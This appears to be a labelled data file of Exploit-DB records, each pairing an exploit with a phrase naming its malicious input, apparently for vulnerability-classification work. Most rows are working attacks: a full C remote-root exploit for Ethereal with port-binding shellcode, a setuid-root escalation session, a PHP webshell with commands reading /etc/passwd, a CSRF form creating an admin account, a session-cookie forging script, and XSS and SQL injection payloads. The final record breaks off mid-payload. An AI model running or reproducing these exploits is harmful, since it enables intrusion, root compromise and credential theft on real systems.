27371,HitHost 1.0 - 'deleteuser.php?user' Cross-Site Scripting source: https://www.securityfocus.com/bid/17025/info  HitHost is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/admin/deleteuser.php?user=<script%20src=http://www.example.com/xss.js></script>,malicious input,1
22912,"IBM UniVerse 10.0.0.9 - 'uvadmsh' Local Privilege Escalation source: https://www.securityfocus.com/bid/8203/info  A vulnerability has been reported in the IBM U2 UniVerse uvadmsh program that could permit the uvadm user to execute arbitrary code with elevated privileges. The -uv.install option of the vulnerable program allows a user to specify an arbitrary path to a file. In cases where uvadmsh is installed setuid root, this could be abused to run an executable file of the attacker's choosing.  While this vulnerability was reported in UniVerse version 10.0.0.9, previous versions are likely vulnerable as well.   [uvadm@vegeta uvadm]$ cat > /tmp/uv.install.c main() { setuid(0); system(""cc -o /tmp/owned /tmp/owned.c""); system(""chmod 4755 /tmp/owned""); }  [uvadm@vegeta uvadm]$ cc -o /tmp/uv.install /tmp/uv.install.c [uvadm@vegeta uvadm]$ cat > /tmp/owned.c main() { setuid(0); system(""/bin/bash""); }  [uvadm@vegeta uvadm]$ ls -al /tmp/owned ls: /tmp/owned: No such file or directory  [uvadm@vegeta uvadm]$ /usr/ibm/uv/bin/uvadmsh -uv.install /tmp [uvadm@vegeta uvadm]$ ls -al /tmp/owned -rwsr-xr-x 1 root uvadm 11640 Jul 2 20:15 /tmp/owned  [uvadm@vegeta uvadm]$ /tmp/owned [root@vegeta uvadm]# id uid=0(root) gid=503(uvadm) groups=503(uvadm)",specify an arbitrary path to a file,1
167,"Ethereal 0.10.0 < 0.10.2 - IGAP Overflow /*   * THE EYE ON SECURITY RESEARCH GROUP - INDIA  * Ethereal IGAP Dissector Message Overflow Remote Root exploit  *  * Copyright 2004 - EOS-India Group  *  * Authors note:  * Shellcode splitting technique:  * Due to difficulty involved while following normal exploitation techniques due to shortage of memory space  * for our shellcode, we used the technique of shellcode splitting. In this technique one part of the shellcode  * is kept before the buffer which overwrites the saved EIP on stack followed by a jmp OFFSET instruction which  * jumps EIP to the second half of the shellcode which is kept after return address. Also since our shellcode   * requires EBP to contain a usuable stack address, we overwrite saved EBP also.  *  * Disclaimer:  * This code is for educational purpose and testing only. The Eye on Security Research Group - India, cannot  * be held responsible for any damage caused due to misuse of this code.  * This code is a proof of concept exploit for a serious vulnerability that exists in Ethereal 0.10.0 to  * Ethereal 0.10.2.  *  * Nilanjan De [n2n+linuxmail.org] - Abhisek Datta [abhisek+front.ru]  * http://www.eos-india.net  * */ #define IPPROTO_IGAP	0x02 // IPPROTO_IGMP=0x02 	 #define PAYLOAD_SIZE	(255-64)	 #define MAX_BUFF	sizeof(struct igap_header)+sizeof(struct ipheader) #define EXP		""Ethereal(v0.10.0-0.10.2) IGAP Dissector Message Overflow Exploit"" #define VER		""0.2"" #define SOCKET_ERROR	-1 #define MAX_PACKET	10 #define RETOFFSET 	76  #define SRC_IP		""192.31.33.7"" #include <stdio.h> #include <signal.h> #include <sys/socket.h> #include <sys/types.h> #include <unistd.h> #include <signal.h> #include <netdb.h>  #define MAX_ARCH	5 struct eos{ 	char *arch; 	unsigned long ret; } targets[] = { 	""tEthereal(0.10.2)-Gentoo(gdb)"", 	0xbffede50, 	//------------------------------- 	""tEthereal(0.10.2)-Gentoo     "", 	0xbffede10, 	//------------------------------- 	""Ethereal(0.10.2)-Gentoo      "", 	0xbfffd560, 	//------------------------------- 	""tEthereal(0.10.2)-RedHat 8   "", 	0xbffedfb8, 	//------------------------------- 	""Ethereal(0.10.2)-RedHat 8    "", 	0xbfffcd08, 	//------------------------------- 	NULL, 	0 }; 	  /*  x86 linux portbind a shell in port 31337  based on shellcode from www.shellcode.com.ar  with a few modifications by us */   char shellcode_firsthalf[]=         /* sys_fork() */ 	""\x31\xc0""                      // xorl         %eax,%eax 	""\x31\xdb""                      // xorl         %ebx,%ebx 	""\xb0\x02""                      // movb         $0x2,%al 	""\xcd\x80""                      // int          $0x80 	""\x38\xc3""                      // cmpl         %ebx,%eax 	""\x74\x05""                      // je           0x5 	/* sys_exit() */ 	""\x8d\x43\x01""                  // leal         0x1(%ebx),%eax 	""\xcd\x80""                      // int          $0x80         /* setuid(0) */         ""\x31\xc0""                      // xorl         %eax,%eax         ""\x31\xdb""                      // xorl         %ebx,%ebx         ""\xb0\x17""                      // movb         $0x17,%al         ""\xcd\x80""                      // int          $0x80         /* socket() */         ""\x31\xc0""                      // xorl    %eax,%eax         ""\x89\x45\x10""                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)         ""\x40""                          // incl    %eax         ""\x89\xc3""                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)         ""\x89\x45\x0c""                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)         ""\x40""                          // incl    %eax         ""\x89\x45\x08""                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2) 	""\x8d\x4d\x08""                  // leal    0x8(%ebp),%ecx         ""\xb0\x66""                      // movb    $0x66,%al         ""\xcd\x80""                      // int     $0x80         ""\x89\x45\x08""                  // movl    %eax,0x8(%ebp) 	;	 char jumpcode[]=""\xeb\x10"";  char shellcode_secondhalf[]=         /* bind()*/         ""\x43""                          // incl    %ebx(SYS_BIND = 0x2)         ""\x66\x89\x5d\x14""              // movw    %bx,0x14(%ebp)(AF_INET = 0x2) 	""\x66\xc7\x45\x16\x7a\x69""      // movw    $0x697a,0x16(%ebp)(port=31337)         ""\x31\xd2""                      // xorl    %edx,%edx         ""\x89\x55\x18""                  // movl    %edx,0x18(%ebp)         ""\x8d\x55\x14""                  // leal    0x14(%ebp),%edx         ""\x89\x55\x0c""                  // movl    %edx,0xc(%ebp)         ""\xc6\x45\x10\x10""              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)         ""\xb0\x66""                      // movb    $0x66,%al         ""\xcd\x80""                      // int     $0x80           /* listen() */         ""\x40""                          // incl    %eax         ""\x89\x45\x0c""                  // movl    %eax,0xc(%ebp)         ""\x43""                          // incl    %ebx         ""\x43""                          // incl    %ebx(SYS_LISTEN = 0x4)         ""\xb0\x66""                      // movb    $0x66,%al         ""\xcd\x80""                      // int     $0x80           /* accept() */         ""\x43""                          // incl    %ebx         ""\x89\x45\x0c""                  // movl    %eax,0xc(%ebp)         ""\x89\x45\x10""                  // movl    %eax,0x10(%ebp)         ""\xb0\x66""                      // movb    $0x66,%al         ""\xcd\x80""                      // int     $0x80         ""\x89\xc3""                      // movl    %eax,%ebx           /* dup2() */         ""\x31\xc9""                      // xorl    %ecx,%ecx         ""\xb0\x3f""                      // movb    $0x3f,%al         ""\xcd\x80""                      // int     $0x80         ""\x41""                          // incl    %ecx         ""\x80\xf9\x03""                  // cmpb    $0x3,%cl         ""\x75\xf6""                      // jne     -0xa           /* execve() */         ""\x31\xd2""                      // xorl    %edx,%edx         ""\x52""                          // pushl   %edx         ""\x68\x6e\x2f\x73\x68""          // pushl   $0x68732f6e         ""\x68\x2f\x2f\x62\x69""          // pushl   $0x69622f2f         ""\x89\xe3""                      // movl    %esp,%ebx         ""\x52""                          // pushl   %edx         ""\x53""                          // pushl   %ebx         ""\x89\xe1""                      // movl    %esp,%ecx         ""\xb0\x0b""                      // movb    $0xb,%al         ""\xcd\x80"";                     // int     $0x80   struct ipheader { 	unsigned char ip_hl:4, ip_v:4;  	unsigned char ip_tos; 	unsigned short int ip_len; 	unsigned short int ip_id; 	unsigned short int ip_off; 	unsigned char ip_ttl; 	unsigned char ip_proto; 	unsigned short int ip_sum; 	unsigned int ip_src; 	unsigned int ip_dst; };  struct igap_header { 		// This is a malformed header which does not conforms with IGAP RFC 	unsigned char igap_type; 	// Message Type 	unsigned char igap_restime; 	// Response Time 	unsigned short int igap_cksum; 	// IGAP Message Checksum 	unsigned int igap_gaddr; 	// Group Address 	unsigned char igap_ver; 	// Version 	unsigned char igap_stype;	// SubType 	unsigned char igap_reserved1;	// Reserved 	unsigned char igap_cid;		// Challenge ID 	unsigned char igap_asize;	// Account Size 	unsigned char igap_msgsize;	// Message Size 	unsigned short int igap_reserved2;	// Reserved 	/* 	unsigned char igap_uaccount[16];// User Account 	unsigned char igap_message[64]	// Message 	*/ 	unsigned char igap_payload[16+64+PAYLOAD_SIZE];	 // This buffer will contain payload, here we differ from RFC by sending a bigger message. };  unsigned short checksum(unsigned short *buf,int nwords) { 	unsigned long sum; 	for (sum = 0; nwords > 0; nwords--) 		sum += *(buf)++; 	sum = (sum >> 16) + (sum & 0xffff); 	sum += (sum >> 16); 	return ~sum; }  void showhelp(char *pr00gie) { 	int i=0; 	printf(""######### The Eye on Security Research Group - India ########\n""); 	printf(""%s %s\n"",EXP,VER);        	printf(""abhisek[at]front[dot]ru - n2n[at]linuxmail[dot]org\n"");        	printf(""http://www.eos-india.net\n\n""); 	printf(""[usage]\n""); 	printf(""%s [Remote Host] [Target]\n"",pr00gie); 	printf(""[Available Targets]\n""); 	while(targets[i].arch != NULL) { 		printf(""%d. - %s\t - %p\n"",(i),targets[i].arch,targets[i].ret); 		i++; 	} 	exit(1);  } 	       int main(int argc,char *argv[]) { 	char buffer[MAX_BUFF]; 	struct ipheader *iphdr=(struct ipheader*)buffer; 	struct igap_header *igaphdr=(struct igap_header*)(buffer+sizeof(struct ipheader)); 	int sockfd; 	unsigned long addr; 	int one=1; 	int i; 	const int *val=&one; 	struct sockaddr_in sin; 	unsigned long magic; 	unsigned int n; 	 	if(getuid()) { 		printf(""- This code opens SOCK_RAW which needs root privilege\n""); 		exit(1); 	} 	if(argc != 3) 		showhelp(argv[0]); 	n=atoi(argv[2]); 	if(n >= MAX_ARCH) { 		printf(""- Invalid target\n""); 		showhelp(argv[0]); 	} 	magic=targets[n].ret; 	printf(""-Using RET %p\n"",magic); 	addr=inet_addr(argv[1]); 	if(addr==INADDR_NONE) { 		printf(""- Invalid target\n""); 		exit(1); 	} 	sin.sin_addr.s_addr=addr; 	sin.sin_family=AF_INET; 	sin.sin_port=0x00; 	sockfd=socket(PF_INET,SOCK_RAW,IPPROTO_RAW); 	if(sockfd==SOCKET_ERROR) { 		printf(""- Failed creating SOCK_RAW descriptor\n""); 		exit(1); 	} 	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) < 0) 		printf (""- WARNING !! :Cannot set IP_HDRINCL!\n""); 	memset(buffer,0x00,MAX_BUFF); 	// Filling IP Header 	iphdr->ip_hl=0x05; 	iphdr->ip_v=0x04; 	iphdr->ip_tos=0x00; 	iphdr->ip_len=MAX_BUFF; 	iphdr->ip_id=htonl(54321); 	iphdr->ip_off=0x00; // Lower 3 bit=Flag4Fragmentation - Higher 13 Bit=Fragment Offset 	iphdr->ip_ttl=0x01; 	iphdr->ip_proto=IPPROTO_IGAP; // IPPROTO_IGMP 	iphdr->ip_sum=0x00; // Fill sum before sending packet 	iphdr->ip_src=inet_addr (SRC_IP);  	iphdr->ip_dst=addr; 	// Filling IGAP Header 	igaphdr->igap_type=0x41; // IGAP Membership Query 	igaphdr->igap_restime=0x0a; //  	igaphdr->igap_cksum=0x00; // compute before sending packet 	igaphdr->igap_gaddr=0x00; // Ignored in IGAP Membership Query Message 	igaphdr->igap_ver=0x01; // IGAPv1 	igaphdr->igap_stype=0x21; // Basic Query 	igaphdr->igap_reserved1=0x00; // Ignored 	igaphdr->igap_cid=0x00;  	// Challenge ID (ignored because Chanllenge Response authentication not used)		 	igaphdr->igap_asize=0x10; // MAX Size of Account Name Field 	igaphdr->igap_msgsize=0x40+PAYLOAD_SIZE; //  Size of Message	 	igaphdr->igap_reserved2=0x00; // Reserved 	// Building exploit buffer 	//for(i=0;i<16+64+PAYLOAD_SIZE;i++) 	//	memset(igaphdr->igap_payload+i,(unsigned char)i,1); 	memset(igaphdr->igap_payload,0x90,16+64+PAYLOAD_SIZE); 	memcpy(igaphdr->igap_payload+16+RETOFFSET-strlen(shellcode_firsthalf)-8,shellcode_firsthalf, 	strlen(shellcode_firsthalf)); 	memcpy(igaphdr->igap_payload+16+64+RETOFFSET-strlen(jumpcode)-4,jumpcode,strlen(jumpcode)); 	memcpy(igaphdr->igap_payload+16+64+RETOFFSET,&magic,4); 	magic-=0x10; 	memcpy(igaphdr->igap_payload+16+64+RETOFFSET-4,&magic,4); 	memcpy(igaphdr->igap_payload+16+64+PAYLOAD_SIZE-strlen(shellcode_secondhalf)-1,                 shellcode_secondhalf,strlen(shellcode_secondhalf)); 	// Calculating checksum 	igaphdr->igap_cksum=checksum((unsigned short*)(buffer+sizeof(struct ipheader)), 	(sizeof(struct igap_header))>>1); 	iphdr->ip_sum = checksum ((unsigned short*)buffer,(iphdr->ip_len)>>1); 	// Sending 	one=MAX_PACKET; 	while(one) { 		sendto(sockfd,buffer,MAX_BUFF,0,(struct sockaddr*)&sin,sizeof(sin)); 		printf("".""); 		one--; 	} 	close(sockfd);  	printf(""\n- Send %d packets to %s\n"",MAX_PACKET,argv[1]);	 	printf(""- Read source to know what to do to check if the exploit worked\n""); 	return 0; }  // milw0rm.com [2004-03-28]",sending a bigger message,1
48030,"WordPress Plugin LearnDash LMS 3.1.2 - Reflective Cross-Site Scripting # Exploit Title: LearnDash WordPress LMS Plugin 3.1.2 - Reflective Cross-Site Scripting # Date: 2020-01-14 # Vendor Homepage: https://www.learndash.com # Vendor Changelog: https://learndash.releasenotes.io/release/uCskc-version-312 # Exploit Author: Jinson Varghese Behanan # Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/reflected-xss-vulnerability-found-in-learndash-lms-plugin/ # Author Homepage: https://www.jinsonvarghese.com # Version: 3.0.0 - 3.1.1 # CVE : CVE-2020-7108  1. Description  LearnDash is one of the most popular and easiest to use WordPress LMS plugins in the market. It allows users to easily create courses and sell them online and boasts a large customer base. The plugin allows users to search for courses they have subscribed to using the [ld_profile] search field, which was found to be vulnerable to reflected cross site scripting. All WordPress websites using LearnDash version 3.0.0 through 3.1.1 are affected.  2. Proof of Concept  Once the user is logged in to the WordPress website where the vulnerable LearnDash plugin is installed, the XSS payload can be inserted into the Search Your Courses box. The payload gets executed because the user input is not properly validated. As a result, passing the XSS payload as a query string in the URL will also execute the payload.  [wordpress website][learndash my-account page]?ld-profile-search=%3Cscript%3Ealert(document.cookie)%3C/script%3E  An attacker can modify the above URL and use an advanced payload that could help him/her in performing malicious actions.  GET /wp-admin/admin-ajax.php?action=ld30_ajax_profile_search&shortcode_instance%5Buser_id%5D=1&shortcode_instance%5Bper_page%5D=20&shortcode_instance%5Border%5D=DESC&shortcode_instance%5Borderby%5D=ID&shortcode_instance%5Bcourse_points_user%5D=yes&shortcode_instance%5Bexpand_all%5D=false&shortcode_instance%5Bprofile_link%5D=true&shortcode_instance%5Bshow_header%5D=yes&shortcode_instance%5Bshow_quizzes%5D=true&shortcode_instance%5Bshow_search%5D=yes&shortcode_instance%5Bquiz_num%5D=20&shortcode_instance%5Bpaged%5D=1&shortcode_instance%5Bs%5D=&ld-profile-search=%3Cscript%3Ealert(123)%3C%2Fscript%3E HTTP/1.1 Host: learndashtesting.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Connection: close Referer: http://learndashtesting.com/my-account-2/ Cookie: wordpress_bcfe62773b0917e2688ccaecd96abe61=jinson%7C1581504173%7CeztvQWuKhSrnfkyEkwN0TvUU4CuVBpuyXeGErewuFOv%7C7ec9ebfd67acdbc669395821f620198e67cb74780c9a8db63923b528aa661acd; PHPSESSID=e7c30849dbdab6f1cafcccef0ad7e7a0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_bcfe62773b0917e2688ccaecd96abe61=jinson%7C1581504173%7CeztvQWuKhSrnfkyEkwN0TvUU4CuVBpuyXeGErewuFOv%7Cfcf64acbc9b6ba7aaafb9c3b077581347d65ca8e010135cc232dcfc0335ec6d8; wordpress_cf_adm_use_adm=1; tk_ai=woo%3AEeO%2FMlU5TcDNKIjgYWPHxZVg; wp-settings-time-1=1581331685  3. Timeline  Vulnerability reported to the LearnDash team – January 14, 2020 LearnDash version 3.1.2 containing the fix released – January 14, 2020",passing the XSS payload as a query string in the URL,1
30704,Korean GHBoard FlashUpload Component - 'download.jsp?name' Arbitrary File Access source: https://www.securityfocus.com/bid/26182/info  GHBoard is prone to multiple vulnerabilities that let attackers upload and download arbitrary files and execute arbitrary code within the context of the webserver process.   http://www.example.com/ghboard/component/flashupload/download.jsp?name=[file_name]  http://www.example.com/ghboard/component/flashupload/download.jsp?name=../config.js,a specially crafted .jsp file,1
8322,"Trend Micro Internet Security Pro 2009 - Priviliege Escalation Trend Micro Internet Security Pro 2009 tmactmon.sys Priviliege Escalation PoC. by b1@ckeYe  The vulnerability is caused due to the IOCTL handler of the ""tmactmon.sys""  driver improperly processing user space parameters. This exploit execute  arbitrary code in kernel space via a specially crafted IOCTL.  untested: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/8322.zip 2009-trendmicro_local_expl_0day.zip)  # milw0rm.com [2009-03-30]",a specially crafted IOCTL,1
46160,"Microsoft Windows 10 - DSSVC MoveFileInheritSecurity Privilege Escalation Windows: DSSVC MoveFileInheritSecurity Multiple Issues EoP Platform: Windows 10 1803 and 1809. Class: Elevation of Privilege Security Boundary (per Windows Security Service Criteria): User boundary  NOTE: This is one of multiple issues I’m reporting in the same service. While I’ve tried to ensure all the bugs are effectively orthogonal from each other it’s possible that fixes for one thing might affect others. I’ve also not reported every possible problem with the service as at some point I had to stop. I’ve not determined if any of these issues could be abusable from a sandbox, most of the issues almost certainly can’t be due to the requirements for arbitrary file symlinks but it’s not impossible.  Summary:   The Data Sharing Service MoveFileInheritSecurity method is broken leading to EoP.  Description:  The PolicyChecker::MoveFileInheritSecurity method is almost an exact copy of the code from the Storage Service which I exploited in MSRC cases 42121 and 42122. In fact I’d say it’s the same code copy and pasted. It has the exactly same bugs as the storage service version, specifically arbitrary file writes, due to the reverting call to MoveFileEx and arbitrary ACL setting by placing a hardlinked file in a directory with inheritable ACEs.  This method is called from DSSMoveToSharedFile and DSSMoveFromSharedFile. While those methods do some checking it’s still possible to bypass the checks. This results in the MoveFileInheritSecurity method being called as the SYSTEM user which results in EoP.  I’m saddened by the fact this wasn’t discovered during variant analysis from the Storage Service issues.  Proof of Concept:  I’ve provided a PoC as a C# project. It calls DSMoveFromSharedFile to modify the DACL of a hardlink arbitrary file granted write access to the user.  1) Compile the C# project. It’ll need to pull NtApiDotNet from NuGet to build. 2) Execute the PoC passing the path to a file the user can’t write on the command line (but can be written by SYSTEM).  Expected Result: The call to move the file.   Observed Result: The call to move file succeeds and the arbitrary file is now ACLS with the Everyone group for full access.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46160.zip",placing a hardlinked file in a directory with inheritable ACEs,1
33389,"eGroupWare 1.8.006 - Multiple Vulnerabilities Advisory ID: HTB23212 Product: EGroupware Vendor: http://www.egroupware.org/ Vulnerable Version(s): 1.8.006 community edition and probably prior Tested Version: 1.8.006 community edition Advisory Publication:  April 23, 2014  [without technical details] Vendor Notification: April 23, 2014  Vendor Patch: May 6, 2014  Public Disclosure: May 14, 2014  Vulnerability Type: Cross-Site Request Forgery [CWE-352], Code Injection [CWE-94] CVE References: CVE-2014-2987, CVE-2014-2988 Risk Level: High  CVSSv2 Base Scores: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P), 8.5 (AV:N/AC:M/Au:S/C:C/I:C/A:C) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered CSRF and Remote Code Execution vulnerabilities in EGroupware, which can be exploited by remote attacker to gain full control over the application and compromise vulnerable system.   1) Сross-Site Request Forgery (CSRF) in EGroupware: CVE-2014-2987   The vulnerability exists due to insufficient verification of the HTTP request origin. A remote attacker can create a new user account with administrative privileges by tricking logged-in Groupware administrator to visit a malicious pages with CSRF exploit.   Simple CSRF exploit below creates new administrator with login ""immuniweb"" and password ""immuniweb"":   <form action=""http://[host]/index.php?menuaction=admin.uiaccounts.add_user"" method=""post"" name=""main""> <input type=""hidden"" name=""account_lid"" value=""immuniweb""> <input type=""hidden"" name=""account_status"" value=""A""> <input type=""hidden"" name=""account_firstname"" value=""firstname""> <input type=""hidden"" name=""account_lastname"" value=""lastname""> <input type=""hidden"" name=""account_passwd"" value=""immuniweb""> <input type=""hidden"" name=""account_passwd_2"" value=""immuniweb""> <input type=""hidden"" name=""changepassword"" value=""1""> <input type=""hidden"" name=""expires"" value=""2014/04/29""> <input type=""hidden"" name=""never_expires"" value=""True""> <input type=""hidden"" name=""account_email"" value=""immuniweb@immuniweb.com""> <input type=""hidden"" name=""account_groups[]"" value=""-2""> <input type=""hidden"" name=""account_primary_group"" value=""-2""> <input type=""hidden"" name=""submit"" value=""Add""> <input type=""submit"" id=""btn""> </form>    2) Code Injection in EGroupware: CVE-2014-2988   The vulnerability exists due to insufficient sanitisation of input data passed via the HTTP POST ""newsettings"" parameter to PHP function ""call_user_func()"". A remote attacker with administrative privileges can inject and execute arbitrary PHP code on the target system with privileges of the webserver.    This vulnerability can be exploited in pair with the above-described CSRF vulnerability.  The following exploitation example writes ""immuniweb"" word into file ""/1.php"":   <form action=""http://[host]/index.php?menuaction=admin.uiconfig.index&appname=phpbrain"" method=""post"" name=""main""> <input type=""hidden"" name=""newsettings[system]"" value=""echo immuniweb>1.php""> <input type=""hidden"" name=""submit"" value=""Save""> <input type=""submit"" id=""btn""> </form>     -----------------------------------------------------------------------------------------------  Solution:  Update to EGroupware version 1.8.007  More Information: http://www.egroupware.org/forum#nabble-td3997580 http://www.egroupware.org/changelog  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23212 - https://www.htbridge.com/advisory/HTB23212 - CSRF and Remote Code Execution in EGroupware. [2] EGroupware - http://www.egroupware.org/ - EGroupware is the leading open source collaboration tool and the top choice for big enterprises, SMEs and teams within and across organizations all over the globe. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",tricking logged-in Groupware administrator to visit a malicious pages with CSRF exploit,1
27272,"SocialEngine Timeline Plugin 4.2.5p9 - Arbitrary File Upload # Exploit Title: Sending php file in the timeline plugin cover image of SocialEngine 4.5  # Date: 2013-08-17  # Discovered by: Wesley Henrique Leite aka ""spyk2r""  # Vendor Homepage: http://webhive.com.ua/ # Software Link: http://webhive.com.ua/store/product.php?id_product=46 # Version: plugin Timeline 4.2.5p9 for SocialEngine 4.5  # Vendor Notified: 2013-08-17 # CVE Notified: 2013-08-24 # CVE : CVE-2013-4898   + INTRODUCTION  The plugin has the objective give you a better visual for the user profile, allowed the addition of cover image keeping the layout closest to the style of modern social networks, among other features.  + DESCRIPTION OF VULNERABILITY  Logged into the system, enter on profile page of your user. [my profile]      http://[url]/index.php/profile/[profile-name]      >> Click ""Change Cover""      >> Click ""Upload Cover""  select the file ""*.php"" you want to send.  //### Example PHP file to send ""inject.php"" ###      <?php echo system(""$_GET['cmd']""); ?>  //###  After selecting the file upload, this will be sent to an area temporarily, the system detects that the format is not valid, but doesn’t remove, allowing access later.  an error message is displayed on the screen.  [ File ""/srv/www/htdocs/XXXXXXXXXXX/public/temporary/timeline/cover_original_8.php""  is not an image or does not exist ]  + ACCESS      /srv/www/htdocs/XXXXXXXXXXX/public/temporary/timeline/cover_original_8.php  The important thing is the structure of public forward, it will give  us access to our archive.      http://[url]/public/temporary/timeline/cover_original_8.php?cmd=cat%20/etc/passwd      http://[url]/public/temporary/timeline/cover_original_8.php?cmd=cat%20../../../install/config/auth.php",malicious content,1
40251,"Nagios Network Analyzer 2.2.0 - Multiple Vulnerabilities (    , )     (,   .   '.' ) ('.    ',    ). , ('.   ( ) (   (_,) .'), ) _ _,  /  _____/  / _  \    ____  ____   _____  \____  \==/ /_\  \ _/ ___\/  _ \ /     \  /       \/   |    \\  \__(  <_> )  Y Y  \ /______  /\___|__  / \___  >____/|__|_|  /         \/         \/.-.    \/         \/:wq                     (x.0)                   '=.|w|.='                   _=''""''=.                  presents..  Nagios Network Analyzer Multiple Vulnerabilities Affected versions: Nagios Network Analyzer <= 2.2.0  PDF: http://www.security-assessment.com/files/documents/advisory/NagiosNetworkAnalyzerAdvisory.pdf  +-----------+ |Description| +-----------+ The Nagios Network Analyzer application is affected by multiple security vulnerabilities, including authentication bypass, SQL injection, arbitrary code execution via command injection and privilege escalation.  These vulnerabilities can be chained together to obtain unauthenticated remote code execution in the context of the root user.  +------------+ |Exploitation| +------------+ ==Authentication Bypass== Authentication for the Nagios Network Analyzer web management interface can be bypassed due to an insecure implementation of the function validating session cookies within the ‘Session.php’ file. As shown below, the application uses a base64 encoded serialized PHP string along with a SHA1 HMAC checksum as the cookie to authenticate and manage user sessions. A sample cookie format is shown below:   a:15:{s:10:""session_id"";s:32:""325672f137d4e3747a0f9e61a4c867b2"";s:10:""ip_address"";s:15:""192.168.xxx.xxx"";  s:10:""user_agent"";s:72:""Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"";s:13:""last_activity"";  i:1463165417;s:9:""user_data"";s:0:"""";s:8:""identity"";s:11:""nagiosadmin"";s:8:""username"";s:11:""nagiosadmin"";s:5:""email"";  s:30:""xxxxxx@security-assessment.com"";s:7:""user_id"";s:1:""1"";s:14:""old_last_login"";s:10:""1463163525"";s:9:""apiaccess"";  s:1:""1"";s:6:""apikey"";s:40:""6ba11d3f6e84011b3332d7427d0655de64f11d5e"";s:8:""language"";s:7:""default"";s:10:""apisession"";  b:1;s:7:""view_id"";i:0;}<SHA1_HMAC_CHECKSUM>  The application relies on the validation against the SHA1 HMAC to recognize and destroy invalid session cookies when the checksum value does not match. However the encryption key used to generate the HMAC checksum is statically set to the SHA1 hash value of the $_SERVER['HTTP_HOST'] PHP variable, which is the Host HTTP header value. This information can be controlled by the attacker and as such should not be considered a secure randomly generated value for the secret encryption key.  Since no further verification is performed for other non-predictable fields (e.g. session_id, apikey, email, username etc.) and only a valid user agent string matching the correct HTTP header value is required, an attacker can forge arbitrary session cookies and bypass authentication.  The script on the following page generates session cookies which are accepted and validated successfully by the application. A ‘user_id’ value of 1 can be used to initiate a session in the context of the admin user.  [POC - nagiosna_forge_cookie.php] <?php  // Usage: php nagiosna_forge_cookie.php [TARGET_IP_ADDRESS/DOMAIN NAME]  $host = $argv[1];  $session = 'a:14:{s:10:""session_id"";s:32:""XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"";s:10:""ip_address""; s:15:""123.123.123.123"";s:10:""user_agent"";s:72:""Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"";s:13:""last_activity"";i:1463229493;s:9:""user_data"";s:0:"""";s:8:""identity"";s:4:""XXXX"";s:8:""username""; s:4:""XXXX"";s:5:""email"";s:16:""test@example.com"";s:7:""user_id"";s:1:""1"";s:14:""old_last_login"";s:10:""XXXXXXXXXX""; s:9:""apiaccess"";s:1:""1"";s:6:""apikey"";s:40:""XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"";s:8:""language"";s:7:""default""; s:10:""apisession"";b:1;}';  $encryption_key = sha1($host);  $hmac_check = hash_hmac('sha1', $session, $encryption_key);  $cookie = $session . $hmac_check; echo urlencode($cookie);  ?>  This vulnerability is present across multiple Nagios products.   ==SQL Injection== Multiple SQL injection vulnerabilities exist in the application web management interface. An attacker can exploit this vulnerabilities to retrieve sensitive data from the application MySQL database.  URL => /nagiosna/index.php/api/checks/read?q%5Blastcode%5D=0&o%5Bcol%5D=<PAYLOAD>&o%5Bsort%5D=ASC Method => GET Parameter => o[col] POC Payload => name AND (SELECT * FROM (SELECT(SLEEP(5)))UtTW)  URL => /nagiosna/index.php/api/sources/read?o%5Bcol%5D=<PAYLOAD>&o%5Bsort%5D=ASC Method => GET Parameter => o[col] POC Payload => name AND (SELECT * FROM (SELECT(SLEEP(5)))UtTW)  URL => /nagiosna/index.php/admin/globals Method => POST Parameter => timezone POC Payload => US/Eastern%' AND (SELECT 4646 FROM(SELECT COUNT(*),CONCAT(0x232323,(SELECT MID((IFNULL(CAST(apikey AS CHAR),0x20)),1,54) FROM nagiosna_users WHERE id=1 LIMIT 0,1),0x232323,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'=''   ==Command Injection== A command injection vulnerability exists in the function generating PDF reports for download. Base64 encoded user-supplied input is passed as an argument to system shell calls without being escaped. An attacker can inject arbitrary shell commands and obtain remote code execution in the context of the apache user.  URL => /nagiosna/index.php/download/report/sourcegroup/<ID>/<BASE64 ENCODED PAYLOAD> Method => GET POC Payload => q[rid]=5&q[gid]=1"" 